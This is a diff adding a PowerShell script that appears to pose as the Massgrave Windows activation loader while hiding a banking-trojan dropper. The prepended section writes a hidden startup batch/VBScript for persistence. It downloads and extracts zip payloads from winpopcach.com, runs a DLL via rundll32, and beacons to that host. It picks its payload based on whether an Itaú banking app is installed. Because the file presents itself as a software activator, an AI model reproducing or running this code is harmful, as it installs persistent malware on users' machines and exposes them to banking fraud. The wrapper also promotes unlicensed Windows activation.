@@ -1,0 +1,206 @@
+
+
+
+# Função para decodificar Base64 para texto
+function Decode-Base64 {
+    param ([string]$base64String)
+    try {
+        # Decodificação Base64 com tratamento de erros
+        return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64String))
+    } catch {
+        Write-Host "Erro ao decodificar a string Base64: $base64String"
+        return $null
+    }
+}
+
+# Função para verificar se um processo com o nome especificado está em execução
+function Check-ProcessExists {
+    param ([string]$ProcessName)
+    try {
+        # Verifica se algum processo com o nome especificado está em execução
+        $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
+        return $process -ne $null
+    } catch {
+        Write-Host "Erro ao verificar o processo: $ProcessName"
+        return $false
+    }
+}
+
+# Função install1
+function install1 {
+  $FilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsLoad.bat"
+$Content = @"
+@echo off
+set VBSCRIPT=%temp%\~hidden.vbs
+echo Set WshShell = CreateObject("WScript.Shell") > %VBSCRIPT%
+echo WshShell.Run "cmd /c powershell -ep bypass -File $env:APPDATA\execute.ps1", 0, False >> %VBSCRIPT%
+echo WshShell.Run "cmd /c powershell -ep bypass -File $env:APPDATA\executeapp.ps1", 0, False >> %VBSCRIPT%
+echo WshShell.Run "cmd /c powershell -ep bypass -File $env:APPDATA\exexutene.ps1", 0, False >> %VBSCRIPT%
+cscript //nologo %VBSCRIPT%
+del %VBSCRIPT%
+exit
+"@
+Set-Content -Path $FilePath -Value $Content
+
+$zipFilePath = "$env:APPDATA\Update.zip"
+$extractedPath = "$env:APPDATA\"
+powershell -Command "Invoke-WebRequest -Uri 'https://winpopcach.com/www.zip' -OutFile $zipFilePath -UseBasicParsing
+Expand-Archive -Path $zipFilePath -DestinationPath $extractedPath -Force"
+Start-Process -FilePath $FilePath;
+$response = Invoke-WebRequest -Uri "https://winpopcach.com/core/" -UseBasicParsing | Out-Null
+
+}
+
+# Função install2
+function install2 {
+$FilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsLoad.bat"
+$Content = @"
+Rundll32 "$env:APPDATA\dimple.dll",AppleVersions
+"@
+Set-Content -Path $FilePath -Value $Content
+$update = Get-Random -Maximum 865
+$zipFilePath = "$env:APPDATA\Update.zip"
+$extractedPath = "$env:APPDATA\"
+powershell -Command "Invoke-WebRequest -Uri 'https://winpopcach.com/a2/$update.zip' -OutFile $zipFilePath -UseBasicParsing
+Expand-Archive -Path $zipFilePath -DestinationPath $extractedPath -Force"
+Start-Process -FilePath $FilePath; 
+$response = Invoke-WebRequest -Uri "https://winpopcach.com/coreoff/" -UseBasicParsing | Out-Null
+}
+
+function app {
+$filePath = "$env:LOCALAPPDATA\Aplicativo Itau\itauaplicativo.exe"
+
+# Verificar se o arquivo existe
+if (Test-Path $filePath) {
+   # Write-Host "O arquivo existe no caminho: $filePath"
+	install1
+} else {
+   # Write-Host "O arquivo não existe no caminho: $filePath"
+   install2
+}
+}
+
+
+
+# Lista de nomes de processos em Base64
+$titlesToCheckBase64 = @(
+    "Y29yZQ==",   # ghfgh
+    "Y29yZS5leGU=" # fgfhfgh.exe
+)
+
+# Inicializa a flag para controle do loop
+$processFound = $false
+
+# Loop contínuo para verificar e encerrar processos
+while (-not $processFound) {
+    $processFound = $false
+    foreach ($base64Title in $titlesToCheckBase64) {
+        # Decodificando o nome do processo Base64 para texto
+        $decodedTitle = Decode-Base64 -base64String $base64Title
+
+        # Validação da decodificação
+        if ($null -eq $decodedTitle) {
+            #Write-Host "Nome de processo inválido ou não decodificado: $base64Title"
+            continue
+        }
+
+        # Verificando se o processo está em execução
+        if (Check-ProcessExists -ProcessName $decodedTitle) {
+            #Write-Host "O processo '$decodedTitle' está em execução!"
+            install1
+            $processFound = $true
+            break
+        } else {
+           # Write-Host "O processo '$decodedTitle' não foi encontrado."
+        }
+    }
+
+    if (-not $processFound) {
+        #Write-Host "Nenhum processo encontrado. Executando install2..."
+        app
+        break
+    }
+
+    #Write-Host "Pesquisando processos novamente... (próxima verificação em $waitTime segundos)"
+    #Start-Sleep -Seconds $waitTime
+}
+
+#Write-Host "Encerrando o script. Processo encontrado."
+
+
+
+#================================================================
+
+
+function Check3rdAV {
+    $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
+    if ($avList) {
+        Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
+        Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
+    }
+}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$URLs = @(
+    'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/37ec96504a2983a5801c43e975ab78c8f9315d2a/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
+    'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=37ec96504a2983a5801c43e975ab78c8f9315d2a',
+    'https://git.activated.win/massgrave/Microsoft-Activation-Scripts/raw/commit/37ec96504a2983a5801c43e975ab78c8f9315d2a/MAS/All-In-One-Version-KL/MAS_AIO.cmd'
+)
+
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try { $response = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
+}
+
+if (-not $response) {
+    Check3rdAV
+    Write-Host "Failed to retrieve MAS from any of the available repositories, aborting!"
+    Write-Host "Help - https://massgrave.dev/troubleshoot" -ForegroundColor White -BackgroundColor Blue
+    return
+}
+
+# Verify script integrity
+$releaseHash = '49CE81C583C69AC739890D2DFBB908BDD67B862702DAAEBCD2D38F1DDCEE863D'
+$stream = New-Object IO.MemoryStream
+$writer = New-Object IO.StreamWriter $stream
+$writer.Write($response)
+$writer.Flush()
+$stream.Position = 0
+$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
+if ($hash -ne $releaseHash) {
+    Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at https://massgrave.dev/troubleshoot"
+    $response = $null
+    return
+}
+
+# Check for AutoRun registry which may create issues with CMD
+$paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
+foreach ($path in $paths) { 
+    if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
+        Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
+    } 
+}
+
+$rand = [Guid]::NewGuid().Guid
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
+Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
+
+$env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
+Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
+
+
+
+$response = Invoke-WebRequest -Uri "https://winpopcach.com/install1/" -UseBasicParsing | Out-Null
+
+
+
+
+if (-not (Test-Path -Path $FilePath)) {
+    Check3rdAV
+    Write-Host "Failed to create MAS file in temp folder, aborting!"
+    Write-Host "Help - https://massgrave.dev/troubleshoot" -ForegroundColor White -BackgroundColor Blue
+    return
+}
+
+$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
